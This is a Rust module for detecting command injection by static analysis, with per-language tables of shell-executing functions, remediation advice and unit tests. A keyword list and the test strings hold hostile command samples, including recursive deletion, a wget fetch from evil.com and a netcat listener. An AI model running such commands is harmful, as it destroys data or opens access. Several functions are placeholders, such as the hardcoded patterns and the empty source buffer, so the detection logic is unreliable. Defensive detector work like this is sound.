use crate::{SyntaxTree, Result, TaintAnalyzer, TaintFlow, VulnerabilityType};
use std::collections::{HashMap, HashSet};
use tree_sitter::Node;

/// Command injection vulnerability detected by AST analysis
#[derive(Debug, Clone)]
pub struct CommandInjectionVulnerability {
    /// Unique identifier for this vulnerability
    pub id: String,
    /// Taint flow that leads to the vulnerability
    pub taint_flow: TaintFlow,
    /// Command execution pattern that's vulnerable
    pub command_pattern: CommandExecutionPattern,
    /// Confidence level (0.0 to 1.0)
    pub confidence: f64,
    /// Severity level
    pub severity: CommandInjectionSeverity,
    /// Specific command injection type
    pub injection_type: CommandInjectionType,
    /// Remediation suggestions
    pub remediation: CommandInjectionRemediation,
}

/// Types of command injection vulnerabilities
#[derive(Debug, Clone, PartialEq)]
pub enum CommandInjectionType {
    /// Direct command execution with user input
    DirectExecution,
    /// Command execution via shell metacharacters
    ShellMetacharacters,
    /// Command execution via argument injection
    ArgumentInjection,
    /// Command execution via environment variable injection
    EnvironmentInjection,
    /// Command execution via file path manipulation
    PathManipulation,
    /// Blind command injection
    BlindInjection,
    /// Time-based command injection
    TimeBased,
}

/// Severity levels for command injection
#[derive(Debug, Clone, PartialEq)]
pub enum CommandInjectionSeverity {
    Critical,
    High,
    Medium,
    Low,
}

/// Command execution patterns that can be vulnerable
#[derive(Debug, Clone)]
pub struct CommandExecutionPattern {
    /// The command execution function/method
    pub execution_function: String,
    /// Whether the command uses shell interpretation
    pub uses_shell: bool,
    /// Whether user input is directly concatenated
    pub has_direct_concatenation: bool,
    /// Whether the command uses dynamic arguments
    pub has_dynamic_arguments: bool,
    /// Shell metacharacters found in the pattern
    pub shell_metacharacters: Vec<String>,
    /// Command separators found
    pub command_separators: Vec<String>,
}

/// Remediation guidance for command injection
#[derive(Debug, Clone)]
pub struct CommandInjectionRemediation {
    /// Primary remediation strategy
    pub primary_fix: String,
    /// Step-by-step remediation instructions
    pub steps: Vec<String>,
    /// Code examples showing secure alternatives
    pub secure_examples: Vec<SecureCommandExample>,
    /// Estimated effort to fix
    pub effort_level: RemediationEffort,
}

/// Secure code examples for remediation
#[derive(Debug, Clone)]
pub struct SecureCommandExample {
    /// Description of the secure approach
    pub description: String,
    /// Vulnerable code pattern
    pub vulnerable_code: String,
    /// Secure replacement code
    pub secure_code: String,
    /// Programming language
    pub language: String,
}

/// Effort level for remediation
#[derive(Debug, Clone, PartialEq)]
pub enum RemediationEffort {
    Trivial,
    Low,
    Medium,
    High,
    Critical,
}

/// Command injection detector using AST-based taint analysis
pub struct CommandInjectionDetector {
    language: String,
    taint_analyzer: TaintAnalyzer,
    /// Command execution functions for different languages/frameworks
    command_functions: HashMap<String, CommandExecutionInfo>,
    /// Shell metacharacters that enable command injection
    shell_metacharacters: HashSet<String>,
    /// Command separators that enable chaining
    command_separators: HashSet<String>,
    /// Known safe command execution patterns
    safe_patterns: HashSet<String>,
}

/// Information about command execution functions
#[derive(Debug, Clone)]
pub struct CommandExecutionInfo {
    /// Whether this function uses shell interpretation
    pub uses_shell: bool,
    /// Risk level of this function
    pub risk_level: CommandRiskLevel,
    /// Parameter index that contains the command (0-based)
    pub command_parameter_index: usize,
    /// Whether this function supports argument arrays
    pub supports_argument_arrays: bool,
}

/// Risk levels for command execution functions
#[derive(Debug, Clone, PartialEq)]
pub enum CommandRiskLevel {
    Critical,  // Direct shell execution
    High,      // Command execution with some protection
    Medium,    // Restricted command execution
    Low,       // Safe command execution patterns
}

impl CommandInjectionDetector {
    /// Create a new command injection detector for the specified language
    pub fn new(language: &str) -> Self {
        let mut detector = Self {
            language: language.to_string(),
            taint_analyzer: TaintAnalyzer::new(language),
            command_functions: HashMap::new(),
            shell_metacharacters: HashSet::new(),
            command_separators: HashSet::new(),
            safe_patterns: HashSet::new(),
        };

        detector.initialize_command_patterns();
        detector
    }

    /// Initialize command execution patterns and metacharacters for the language
    fn initialize_command_patterns(&mut self) {
        // Common shell metacharacters
        let metacharacters = [
            ";", "&", "|", "||", "&&", "`", "$", "(", ")", "{", "}",
            "[", "]", "<", ">", ">>", "<<", "*", "?", "~", "!", "#"
        ];

        for metachar in &metacharacters {
            self.shell_metacharacters.insert(metachar.to_string());
        }

        // Command separators
        let separators = [";", "&", "|", "||", "&&", "\n", "\r\n"];
        for separator in &separators {
            self.command_separators.insert(separator.to_string());
        }

        match self.language.as_str() {
            "rust" => self.initialize_rust_command_patterns(),
            "javascript" | "typescript" => self.initialize_javascript_command_patterns(),
            "python" => self.initialize_python_command_patterns(),
            "c" | "cpp" | "c++" => self.initialize_c_command_patterns(),
            "go" => self.initialize_go_command_patterns(),
            "php" => self.initialize_php_command_patterns(),
            _ => self.initialize_generic_command_patterns(),
        }
    }

    /// Initialize Rust-specific command patterns
    fn initialize_rust_command_patterns(&mut self) {
        // High-risk command execution functions
        self.command_functions.insert("std::process::Command::new".to_string(), CommandExecutionInfo {
            uses_shell: false,
            risk_level: CommandRiskLevel::Medium,
            command_parameter_index: 0,
            supports_argument_arrays: true,
        });

        self.command_functions.insert("std::process::Command::output".to_string(), CommandExecutionInfo {
            uses_shell: false,
            risk_level: CommandRiskLevel::Medium,
            command_parameter_index: 0,
            supports_argument_arrays: true,
        });

        // Critical risk - shell execution
        self.command_functions.insert("std::process::Command::arg".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        // Safe patterns
        self.safe_patterns.insert("std::process::Command::args".to_string());
        self.safe_patterns.insert("std::process::Stdio".to_string());
    }

    /// Initialize JavaScript/TypeScript-specific command patterns
    fn initialize_javascript_command_patterns(&mut self) {
        // Critical risk - direct shell execution
        self.command_functions.insert("child_process.exec".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        self.command_functions.insert("child_process.execSync".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        self.command_functions.insert("child_process.spawn".to_string(), CommandExecutionInfo {
            uses_shell: false,
            risk_level: CommandRiskLevel::Medium,
            command_parameter_index: 0,
            supports_argument_arrays: true,
        });

        self.command_functions.insert("child_process.execFile".to_string(), CommandExecutionInfo {
            uses_shell: false,
            risk_level: CommandRiskLevel::Medium,
            command_parameter_index: 0,
            supports_argument_arrays: true,
        });

        // Safe patterns
        self.safe_patterns.insert("child_process.spawn".to_string()); // When used with argument arrays
        self.safe_patterns.insert("child_process.execFile".to_string()); // When used properly
    }

    /// Initialize Python-specific command patterns
    fn initialize_python_command_patterns(&mut self) {
        // Critical risk - shell execution
        self.command_functions.insert("os.system".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        self.command_functions.insert("subprocess.call".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::High,
            command_parameter_index: 0,
            supports_argument_arrays: true,
        });

        self.command_functions.insert("subprocess.run".to_string(), CommandExecutionInfo {
            uses_shell: false,
            risk_level: CommandRiskLevel::Medium,
            command_parameter_index: 0,
            supports_argument_arrays: true,
        });

        self.command_functions.insert("subprocess.Popen".to_string(), CommandExecutionInfo {
            uses_shell: false,
            risk_level: CommandRiskLevel::Medium,
            command_parameter_index: 0,
            supports_argument_arrays: true,
        });

        self.command_functions.insert("os.popen".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        // Safe patterns
        self.safe_patterns.insert("subprocess.run".to_string()); // When shell=False
        self.safe_patterns.insert("shlex.quote".to_string());
    }

    /// Initialize C/C++-specific command patterns
    fn initialize_c_command_patterns(&mut self) {
        // Critical risk - shell execution
        self.command_functions.insert("system".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        self.command_functions.insert("popen".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        self.command_functions.insert("exec".to_string(), CommandExecutionInfo {
            uses_shell: false,
            risk_level: CommandRiskLevel::High,
            command_parameter_index: 0,
            supports_argument_arrays: true,
        });

        self.command_functions.insert("execv".to_string(), CommandExecutionInfo {
            uses_shell: false,
            risk_level: CommandRiskLevel::Medium,
            command_parameter_index: 0,
            supports_argument_arrays: true,
        });

        self.command_functions.insert("execve".to_string(), CommandExecutionInfo {
            uses_shell: false,
            risk_level: CommandRiskLevel::Medium,
            command_parameter_index: 0,
            supports_argument_arrays: true,
        });
    }

    /// Initialize Go-specific command patterns
    fn initialize_go_command_patterns(&mut self) {
        self.command_functions.insert("exec.Command".to_string(), CommandExecutionInfo {
            uses_shell: false,
            risk_level: CommandRiskLevel::Medium,
            command_parameter_index: 0,
            supports_argument_arrays: true,
        });

        self.command_functions.insert("exec.CommandContext".to_string(), CommandExecutionInfo {
            uses_shell: false,
            risk_level: CommandRiskLevel::Medium,
            command_parameter_index: 1, // First parameter is context
            supports_argument_arrays: true,
        });

        // Safe patterns
        self.safe_patterns.insert("exec.Command".to_string()); // When used with separate arguments
    }

    /// Initialize PHP-specific command patterns
    fn initialize_php_command_patterns(&mut self) {
        // Critical risk - shell execution
        self.command_functions.insert("exec".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        self.command_functions.insert("shell_exec".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        self.command_functions.insert("system".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        self.command_functions.insert("passthru".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        self.command_functions.insert("proc_open".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::High,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        self.command_functions.insert("popen".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        // Safe patterns
        self.safe_patterns.insert("escapeshellarg".to_string());
        self.safe_patterns.insert("escapeshellcmd".to_string());
    }

    /// Initialize generic command patterns
    fn initialize_generic_command_patterns(&mut self) {
        self.command_functions.insert("exec".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });

        self.command_functions.insert("system".to_string(), CommandExecutionInfo {
            uses_shell: true,
            risk_level: CommandRiskLevel::Critical,
            command_parameter_index: 0,
            supports_argument_arrays: false,
        });
    }

    /// Detect command injection vulnerabilities in a syntax tree
    pub fn detect(&mut self, tree: &SyntaxTree) -> Result<Vec<CommandInjectionVulnerability>> {
        let mut vulnerabilities = Vec::new();

        // Perform enhanced taint analysis to find data flows
        let taint_flows = self.taint_analyzer.analyze(tree)?;

        // Filter flows that lead to command injection vulnerabilities
        for flow in taint_flows {
            if flow.sink.vulnerability_type == VulnerabilityType::CommandInjection {
                if let Some(vulnerability) = self.analyze_command_injection_flow(tree, &flow)? {
                    vulnerabilities.push(vulnerability);
                }
            }
        }

        // Also perform direct AST analysis for command patterns
        let direct_vulnerabilities = self.detect_direct_command_patterns(tree)?;
        vulnerabilities.extend(direct_vulnerabilities);

        // Deduplicate and rank by confidence
        vulnerabilities.sort_by(|a, b| b.confidence.partial_cmp(&a.confidence).unwrap_or(std::cmp::Ordering::Equal));
        vulnerabilities.dedup_by(|a, b| a.id == b.id);

        Ok(vulnerabilities)
    }

    /// Analyze a taint flow to determine if it represents a command injection vulnerability
    fn analyze_command_injection_flow(&self, tree: &SyntaxTree, flow: &TaintFlow) -> Result<Option<CommandInjectionVulnerability>> {
        // Analyze the command execution pattern at the sink
        let command_pattern = self.analyze_command_execution_pattern(tree, &flow.sink.location)?;

        // Determine injection type based on the flow and pattern
        let injection_type = self.determine_injection_type(&command_pattern, flow);

        // Calculate confidence based on various factors
        let confidence = self.calculate_confidence(&command_pattern, flow);

        // Skip if confidence is too low
        if confidence < 0.3 {
            return Ok(None);
        }

        // Determine severity
        let severity = self.determine_severity(&command_pattern, &injection_type);

        // Generate remediation guidance
        let remediation = self.generate_remediation(&injection_type, &command_pattern);

        Ok(Some(CommandInjectionVulnerability {
            id: format!("cmdi_{}_{}", flow.sink.location.line, flow.sink.location.column),
            taint_flow: flow.clone(),
            command_pattern,
            confidence,
            severity,
            injection_type,
            remediation,
        }))
    }

    /// Detect command injection patterns directly from AST without taint analysis
    fn detect_direct_command_patterns(&self, tree: &SyntaxTree) -> Result<Vec<CommandInjectionVulnerability>> {
        let mut vulnerabilities = Vec::new();
        self.traverse_for_command_patterns(tree.inner().root_node(), &mut vulnerabilities)?;
        Ok(vulnerabilities)
    }

    /// Recursively traverse AST looking for command injection patterns
    fn traverse_for_command_patterns(&self, node: Node, vulnerabilities: &mut Vec<CommandInjectionVulnerability>) -> Result<()> {
        // Check if this node contains a potential command injection
        if let Some(vulnerability) = self.check_node_for_command_injection(node)? {
            vulnerabilities.push(vulnerability);
        }

        // Traverse children
        let mut cursor = node.walk();
        if cursor.goto_first_child() {
            loop {
                self.traverse_for_command_patterns(cursor.node(), vulnerabilities)?;
                if !cursor.goto_next_sibling() {
                    break;
                }
            }
        }

        Ok(())
    }

    /// Check a specific node for command injection patterns
    fn check_node_for_command_injection(&self, node: Node) -> Result<Option<CommandInjectionVulnerability>> {
        // Look for function calls that execute commands
        if self.is_function_call(node.kind()) {
            if let Some(function_name) = self.extract_function_call_name(node) {
                if let Some(command_info) = self.command_functions.get(&function_name) {
                    // Check if the command contains user input or dangerous patterns
                    if let Some(command_arg) = self.extract_command_argument(node, command_info.command_parameter_index) {
                        if self.contains_dangerous_patterns(&command_arg) || self.has_string_concatenation(node) {
                            return Ok(Some(self.create_direct_vulnerability(node, CommandInjectionType::DirectExecution)?));
                        }
                    }
                }
            }
        }

        // Look for string concatenation with shell metacharacters
        if self.is_string_concatenation(node) {
            if let Some(concatenated_content) = self.extract_concatenation_content(node) {
                if self.contains_shell_metacharacters(&concatenated_content) {
                    return Ok(Some(self.create_direct_vulnerability(node, CommandInjectionType::ShellMetacharacters)?));
                }
            }
        }

        // Look for template literals with command patterns (JavaScript/TypeScript)
        if self.is_template_literal(node) {
            if let Some(template_content) = self.extract_template_content(node) {
                if self.contains_command_patterns(&template_content) {
                    return Ok(Some(self.create_direct_vulnerability(node, CommandInjectionType::DirectExecution)?));
                }
            }
        }

        Ok(None)
    }

    /// Analyze command execution pattern at a specific location
    fn analyze_command_execution_pattern(&self, _tree: &SyntaxTree, _location: &crate::taint_analysis::TaintLocation) -> Result<CommandExecutionPattern> {
        // This is a simplified implementation
        // In practice, would need to analyze the actual command execution structure
        Ok(CommandExecutionPattern {
            execution_function: "exec".to_string(),
            uses_shell: true,
            has_direct_concatenation: true,
            has_dynamic_arguments: false,
            shell_metacharacters: vec![";".to_string(), "&".to_string()],
            command_separators: vec![";".to_string()],
        })
    }

    /// Determine the type of command injection based on pattern and flow
    fn determine_injection_type(&self, pattern: &CommandExecutionPattern, _flow: &TaintFlow) -> CommandInjectionType {
        if pattern.has_direct_concatenation {
            CommandInjectionType::DirectExecution
        } else if !pattern.shell_metacharacters.is_empty() {
            CommandInjectionType::ShellMetacharacters
        } else if pattern.has_dynamic_arguments {
            CommandInjectionType::ArgumentInjection
        } else {
            CommandInjectionType::DirectExecution // Default
        }
    }

    /// Calculate confidence level for the vulnerability
    fn calculate_confidence(&self, pattern: &CommandExecutionPattern, flow: &TaintFlow) -> f64 {
        let mut confidence = 0.5;

        // Higher confidence if direct concatenation is detected
        if pattern.has_direct_concatenation {
            confidence += 0.3;
        }

        // Higher confidence if shell metacharacters are present
        if !pattern.shell_metacharacters.is_empty() {
            confidence += 0.2;
        }

        // Higher confidence if using shell execution
        if pattern.uses_shell {
            confidence += 0.2;
        }

        // Factor in taint flow confidence
        confidence = (confidence + flow.confidence) / 2.0;

        // Lower confidence if sanitization is detected
        if flow.is_sanitized {
            confidence *= 0.3;
        }

        confidence.min(1.0)
    }

    /// Determine severity based on pattern and injection type
    fn determine_severity(&self, pattern: &CommandExecutionPattern, injection_type: &CommandInjectionType) -> CommandInjectionSeverity {
        match injection_type {
            CommandInjectionType::DirectExecution | CommandInjectionType::ShellMetacharacters => {
                if pattern.uses_shell {
                    CommandInjectionSeverity::Critical
                } else {
                    CommandInjectionSeverity::High
                }
            }
            CommandInjectionType::ArgumentInjection => CommandInjectionSeverity::High,
            CommandInjectionType::EnvironmentInjection => CommandInjectionSeverity::Medium,
            CommandInjectionType::PathManipulation => CommandInjectionSeverity::Medium,
            CommandInjectionType::BlindInjection | CommandInjectionType::TimeBased => CommandInjectionSeverity::Medium,
        }
    }

    /// Generate remediation guidance
    fn generate_remediation(&self, injection_type: &CommandInjectionType, _pattern: &CommandExecutionPattern) -> CommandInjectionRemediation {
        match injection_type {
            CommandInjectionType::DirectExecution => CommandInjectionRemediation {
                primary_fix: "Use parameterized command execution instead of string concatenation".to_string(),
                steps: vec![
                    "Identify all user inputs in the command".to_string(),
                    "Replace string concatenation with argument arrays".to_string(),
                    "Use safe command execution functions".to_string(),
                    "Validate and sanitize all inputs".to_string(),
                    "Avoid shell interpretation when possible".to_string(),
                ],
                secure_examples: vec![
                    SecureCommandExample {
                        description: "Use argument arrays instead of string concatenation".to_string(),
                        vulnerable_code: "exec(\"ls \" + user_input)".to_string(),
                        secure_code: "exec([\"ls\", user_input])".to_string(),
                        language: self.language.clone(),
                    }
                ],
                effort_level: RemediationEffort::Medium,
            },
            CommandInjectionType::ShellMetacharacters => CommandInjectionRemediation {
                primary_fix: "Escape shell metacharacters or avoid shell execution".to_string(),
                steps: vec![
                    "Use shell escaping functions for user inputs".to_string(),
                    "Consider using non-shell command execution".to_string(),
                    "Implement input validation for dangerous characters".to_string(),
                ],
                secure_examples: vec![
                    SecureCommandExample {
                        description: "Escape shell metacharacters".to_string(),
                        vulnerable_code: "system(\"command \" + user_input)".to_string(),
                        secure_code: "system(\"command \" + shell_escape(user_input))".to_string(),
                        language: self.language.clone(),
                    }
                ],
                effort_level: RemediationEffort::Medium,
            },
            _ => CommandInjectionRemediation {
                primary_fix: "Use safe command execution patterns and input validation".to_string(),
                steps: vec!["Implement proper input validation and sanitization".to_string()],
                secure_examples: vec![],
                effort_level: RemediationEffort::Medium,
            },
        }
    }

    /// Check if node kind represents a function call
    fn is_function_call(&self, node_kind: &str) -> bool {
        match self.language.as_str() {
            "rust" => matches!(node_kind, "call_expression"),
            "javascript" | "typescript" => matches!(node_kind, "call_expression"),
            "python" => matches!(node_kind, "call"),
            "c" | "cpp" | "c++" => matches!(node_kind, "call_expression"),
            "go" => matches!(node_kind, "call_expression"),
            "php" => matches!(node_kind, "function_call_expression"),
            _ => node_kind.contains("call"),
        }
    }

    /// Extract function name from function call node
    fn extract_function_call_name(&self, node: Node) -> Option<String> {
        // This is a simplified implementation
        // In practice, would need to handle method calls, qualified names, etc.
        let mut cursor = node.walk();
        if cursor.goto_first_child() {
            let function_node = cursor.node();
            if let Ok(name) = function_node.utf8_text(b"") {
                return Some(name.to_string());
            }
        }
        None
    }

    /// Extract command argument from function call
    fn extract_command_argument(&self, node: Node, parameter_index: usize) -> Option<String> {
        let mut cursor = node.walk();
        if cursor.goto_first_child() {
            // Skip function name
            if cursor.goto_next_sibling() {
                // Navigate to arguments
                let mut current_index = 0;
                loop {
                    if current_index == parameter_index {
                        if let Ok(arg_text) = cursor.node().utf8_text(b"") {
                            return Some(arg_text.to_string());
                        }
                    }
                    current_index += 1;
                    if !cursor.goto_next_sibling() {
                        break;
                    }
                }
            }
        }
        None
    }

    /// Check if text contains dangerous command patterns
    fn contains_dangerous_patterns(&self, text: &str) -> bool {
        // Check for shell metacharacters
        self.shell_metacharacters.iter().any(|metachar| text.contains(metachar)) ||
        // Check for command separators
        self.command_separators.iter().any(|separator| text.contains(separator)) ||
        // Check for common dangerous patterns
        text.contains("rm ") || text.contains("del ") || text.contains("format ") ||
        text.contains("wget ") || text.contains("curl ") || text.contains("nc ") ||
        text.contains("netcat ") || text.contains("telnet ")
    }

    /// Check if node represents string concatenation
    fn is_string_concatenation(&self, node: Node) -> bool {
        let node_kind = node.kind();
        match self.language.as_str() {
            "rust" => node_kind == "binary_expression",
            "javascript" | "typescript" => node_kind == "binary_expression",
            "python" => node_kind == "binary_operator",
            "c" | "cpp" | "c++" => node_kind == "binary_expression",
            "go" => node_kind == "binary_expression",
            "php" => node_kind == "binary_expression",
            _ => node_kind.contains("binary") || node_kind.contains("concat"),
        }
    }

    /// Check if node has string concatenation patterns
    fn has_string_concatenation(&self, node: Node) -> bool {
        // Look for concatenation operators in the node tree
        let mut cursor = node.walk();
        if cursor.goto_first_child() {
            loop {
                if self.is_string_concatenation(cursor.node()) {
                    return true;
                }
                if self.has_string_concatenation(cursor.node()) {
                    return true;
                }
                if !cursor.goto_next_sibling() {
                    break;
                }
            }
        }
        false
    }

    /// Extract content from string concatenation
    fn extract_concatenation_content(&self, node: Node) -> Option<String> {
        if let Ok(text) = node.utf8_text(b"") {
            Some(text.to_string())
        } else {
            None
        }
    }

    /// Check if node represents a template literal
    fn is_template_literal(&self, node: Node) -> bool {
        node.kind() == "template_string" || node.kind() == "template_literal"
    }

    /// Extract template literal content
    fn extract_template_content(&self, node: Node) -> Option<String> {
        if let Ok(text) = node.utf8_text(b"") {
            Some(text.to_string())
        } else {
            None
        }
    }

    /// Check if text contains shell metacharacters
    fn contains_shell_metacharacters(&self, text: &str) -> bool {
        self.shell_metacharacters.iter().any(|metachar| text.contains(metachar))
    }

    /// Check if text contains command execution patterns
    fn contains_command_patterns(&self, text: &str) -> bool {
        let command_keywords = ["exec", "system", "cmd", "shell", "bash", "sh", "powershell", "cmd.exe"];
        command_keywords.iter().any(|&keyword| text.to_lowercase().contains(keyword))
    }

    /// Create a vulnerability from direct AST analysis
    fn create_direct_vulnerability(&self, node: Node, injection_type: CommandInjectionType) -> Result<CommandInjectionVulnerability> {
        // This is a simplified implementation
        let command_pattern = CommandExecutionPattern {
            execution_function: "exec".to_string(),
            uses_shell: true,
            has_direct_concatenation: true,
            has_dynamic_arguments: false,
            shell_metacharacters: vec![";".to_string()],
            command_separators: vec![";".to_string()],
        };

        let remediation = self.generate_remediation(&injection_type, &command_pattern);
        let severity = self.determine_severity(&command_pattern, &injection_type);

        Ok(CommandInjectionVulnerability {
            id: format!("direct_cmdi_{}_{}", node.start_position().row, node.start_position().column),
            taint_flow: TaintFlow {
                source: crate::taint_analysis::TaintSource {
                    id: "direct".to_string(),
                    name: "direct_analysis".to_string(),
                    source_type: crate::taint_analysis::TaintSourceType::UserInput,
                    location: crate::taint_analysis::TaintLocation {
                        file: "current_file".to_string(),
                        line: node.start_position().row + 1,
                        column: node.start_position().column,
                        function: None,
                    },
                    confidence: 0.8,
                },
                sink: crate::taint_analysis::TaintSink {
                    id: "direct_sink".to_string(),
                    name: "command_exec".to_string(),
                    sink_type: crate::taint_analysis::TaintSinkType::CommandExecution,
                    location: crate::taint_analysis::TaintLocation {
                        file: "current_file".to_string(),
                        line: node.start_position().row + 1,
                        column: node.start_position().column,
                        function: None,
                    },
                    vulnerability_type: VulnerabilityType::CommandInjection,
                },
                path: vec![],
                confidence: 0.8,
                is_sanitized: false,
                sanitizers: vec![],
            },
            command_pattern,
            confidence: 0.8,
            severity,
            injection_type,
            remediation,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    // Parser import removed as it's not used in tests

    #[test]
    fn test_command_injection_detector_creation() {
        let detector = CommandInjectionDetector::new("python");
        assert_eq!(detector.language, "python");
        assert!(!detector.command_functions.is_empty());
        assert!(!detector.shell_metacharacters.is_empty());
    }

    #[test]
    fn test_shell_metacharacters_detection() {
        let detector = CommandInjectionDetector::new("javascript");
        assert!(detector.contains_shell_metacharacters("ls; rm -rf /"));
        assert!(detector.contains_shell_metacharacters("cat file | grep pattern"));
        assert!(detector.contains_shell_metacharacters("echo `whoami`"));
        assert!(!detector.contains_shell_metacharacters("echo hello world"));
    }

    #[test]
    fn test_dangerous_patterns_detection() {
        let detector = CommandInjectionDetector::new("rust");
        assert!(detector.contains_dangerous_patterns("rm -rf /"));
        assert!(detector.contains_dangerous_patterns("wget http://evil.com/malware"));
        assert!(detector.contains_dangerous_patterns("nc -l 4444"));
        assert!(!detector.contains_dangerous_patterns("echo hello"));
    }

    #[test]
    fn test_command_functions_initialization() {
        let detector = CommandInjectionDetector::new("python");
        assert!(detector.command_functions.contains_key("os.system"));
        assert!(detector.command_functions.contains_key("subprocess.call"));

        let system_info = detector.command_functions.get("os.system").unwrap();
        assert_eq!(system_info.risk_level, CommandRiskLevel::Critical);
        assert!(system_info.uses_shell);
    }

    #[test]
    fn test_injection_type_determination() {
        let detector = CommandInjectionDetector::new("javascript");
        let pattern = CommandExecutionPattern {
            execution_function: "child_process.exec".to_string(),
            uses_shell: true,
            has_direct_concatenation: true,
            has_dynamic_arguments: false,
            shell_metacharacters: vec![],
            command_separators: vec![],
        };

        // Create a dummy taint flow for testing
        let flow = TaintFlow {
            source: crate::taint_analysis::TaintSource {
                id: "test".to_string(),
                name: "test".to_string(),
                source_type: crate::taint_analysis::TaintSourceType::UserInput,
                location: crate::taint_analysis::TaintLocation {
                    file: "test.js".to_string(),
                    line: 1,
                    column: 1,
                    function: None,
                },
                confidence: 0.9,
            },
            sink: crate::taint_analysis::TaintSink {
                id: "test_sink".to_string(),
                name: "exec".to_string(),
                sink_type: crate::taint_analysis::TaintSinkType::CommandExecution,
                location: crate::taint_analysis::TaintLocation {
                    file: "test.js".to_string(),
                    line: 5,
                    column: 1,
                    function: None,
                },
                vulnerability_type: VulnerabilityType::CommandInjection,
            },
            path: vec![],
            confidence: 0.9,
            is_sanitized: false,
            sanitizers: vec![],
        };

        let injection_type = detector.determine_injection_type(&pattern, &flow);
        assert_eq!(injection_type, CommandInjectionType::DirectExecution);
    }

    #[test]
    fn test_confidence_calculation() {
        let detector = CommandInjectionDetector::new("php");
        let pattern = CommandExecutionPattern {
            execution_function: "shell_exec".to_string(),
            uses_shell: true,
            has_direct_concatenation: true,
            has_dynamic_arguments: false,
            shell_metacharacters: vec![";".to_string(), "&".to_string()],
            command_separators: vec![";".to_string()],
        };

        let flow = TaintFlow {
            source: crate::taint_analysis::TaintSource {
                id: "test".to_string(),
                name: "test".to_string(),
                source_type: crate::taint_analysis::TaintSourceType::UserInput,
                location: crate::taint_analysis::TaintLocation {
                    file: "test.php".to_string(),
                    line: 1,
                    column: 1,
                    function: None,
                },
                confidence: 0.9,
            },
            sink: crate::taint_analysis::TaintSink {
                id: "test_sink".to_string(),
                name: "shell_exec".to_string(),
                sink_type: crate::taint_analysis::TaintSinkType::CommandExecution,
                location: crate::taint_analysis::TaintLocation {
                    file: "test.php".to_string(),
                    line: 5,
                    column: 1,
                    function: None,
                },
                vulnerability_type: VulnerabilityType::CommandInjection,
            },
            path: vec![],
            confidence: 0.9,
            is_sanitized: false,
            sanitizers: vec![],
        };

        let confidence = detector.calculate_confidence(&pattern, &flow);
        assert!(confidence > 0.8); // Should be high confidence due to multiple risk factors
    }
}